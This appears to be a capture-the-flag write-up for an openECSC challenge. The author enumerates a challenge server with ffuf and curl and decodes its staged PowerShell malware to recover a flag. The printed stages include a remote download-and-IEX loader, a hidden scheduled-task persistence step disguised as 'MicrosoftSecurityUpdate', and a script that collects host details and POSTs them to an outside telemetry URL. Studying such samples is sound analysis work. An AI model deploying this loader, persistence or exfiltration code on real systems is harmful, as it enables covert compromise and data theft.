URL 2:

❯ ffuf -w /usr/share/wordlists/fuff/common.txt -u "$URL/FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuff/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 200, Size: 82, Words: 2, Lines: 2, Duration: 272ms]
health                  [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 303ms]
:: Progress: [4686/4686] :: Job [1/1] :: 139 req/sec :: Duration: [0:00:36] :: Errors: 0 ::


https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/docs -> 

https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v1/status

```sh
❯ curl -i https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v1/status

HTTP/1.1 200 OK
Content-Length: 54
Content-Type: application/json
Date: Sat, 04 Oct 2025 04:43:37 GMT
Server: Werkzeug/3.1.3 Python/3.11.13

{"status":"active","uptime":"147h","version":"2.1.4"}
❯ curl -i https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v2/status

HTTP/1.1 404 Not Found
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sat, 04 Oct 2025 04:43:45 GMT
Server: Werkzeug/3.1.3 Python/3.11.13

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v2/validate

```sh
❯ curl -i "https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v2/validate"
HTTP/1.1 200 OK
Content-Length: 319
Content-Type: text/html; charset=utf-8
Date: Sat, 04 Oct 2025 04:44:18 GMT
Server: Werkzeug/3.1.3 Python/3.11.13

$wc = New-Object System.Net.WebClient;
$wc.Headers.Add("User-Agent", "Microsoft-Office/16.0");
$wc.Headers.Add("Accept", "application/json");
$resp = $wc.DownloadString("https://openecsc-captcha.com/secure/auth/token");
$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($resp));
IEX $dec;%    
❯ curl -i "https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/v1/validate"
HTTP/1.1 404 Not Found
Content-Length: 207
Content-Type: text/html; charset=utf-8
Date: Sat, 04 Oct 2025 04:44:39 GMT
Server: Werkzeug/3.1.3 Python/3.11.13

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
``` 

so there must be 

https://openecsc-captcha.com/secure/auth/token

https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/secure/auth/token

```sh
❯ curl -s "https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/secure/auth/token" | base64 -d

$taskName = "MicrosoftSecurityUpdate";
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://openecsc-captcha.com/api/system/update')";
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME;
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;

$obf1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("openECSC{y0u_c4n_h1de_but_y0u_must_"));

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description $obf1 -Force;
```

openECSC{y0u_c4n_h1de_but_y0u_must_bagagwaaaaa_1338}

https://openecsc-captcha.com/api/system/update
https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/system/update

```sh
❯ curl -s "https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/system/update" | base64 -d

$output = @();
$output += "Hostname: " + $env:COMPUTERNAME;
$output += "Username: " + $env:USERNAME;
$output += "OS: " + (Get-WmiObject Win32_OperatingSystem).Caption;
$output += "Architecture: " + $env:PROCESSOR_ARCHITECTURE;

$results = @{
    "timestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss";
    "command" = "system_info";
    "output" = ($output -join "`n");
};

$jsonData = ConvertTo-Json $results -Compress;
$encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($jsonData));

$client = New-Object System.Net.WebClient;
$client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
# TODO double check if exfiltration was successfull with making a GET request
$client.UploadString("https://openecsc-captcha.com/api/telemetry/submit", "POST", "metrics=" + $encodedData);
```

https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/telemetry/submit
https://openecsc-captcha.com/api/telemetry/submit

```sh
❯ curl -i "https://8a3b2a49-a850-42fc-b7b9-ebc791b0663e.openec.sc:1337/api/telemetry/submit"
HTTP/1.1 200 OK
Content-Length: 1004
Content-Type: application/json
Date: Sat, 04 Oct 2025 04:48:06 GMT
Server: Werkzeug/3.1.3 Python/3.11.13

{"commands":[{"command":"system_info","executed":"2025-10-02 14:30:15","id":1,"status":"completed"},{"command":"browser_data","executed":"2025-10-02 14:31:42","id":2,"status":"completed"},{"command":"network_scan","executed":"2025-10-02 14:35:21","id":3,"status":"completed"},{"command":"process_list","executed":"2025-10-02 14:38:05","id":4,"status":"completed"},{"command":"installed_software","executed":"2025-10-02 14:42:33","id":5,"status":"completed"},{"command":"screenshot","executed":"2025-10-02 14:45:18","id":6,"status":"completed"},{"command":"keylog_dump","executed":"2025-10-02 14:50:07","id":7,"status":"completed"},{"command":"credential_harvest","executed":"2025-10-02 14:55:44","id":8,"status":"completed"},{"command":"lateral_movement","executed":"2025-10-02 15:02:11","id":9,"status":"failed"},{"command":"persistence_check","executed":"2025-10-02 15:08:29","id":10,"status":"completed"}],"data":"YmFnYWd3YWFhYWFfMTMzOH0=","last_execution":"2025-10-02 14:32:18","total_commands":847}
```

```sh
❯ echo "YmFnYWd3YWFhYWFfMTMzOH0=" | base64 -d
bagagwaaaaa_1338}%   
```  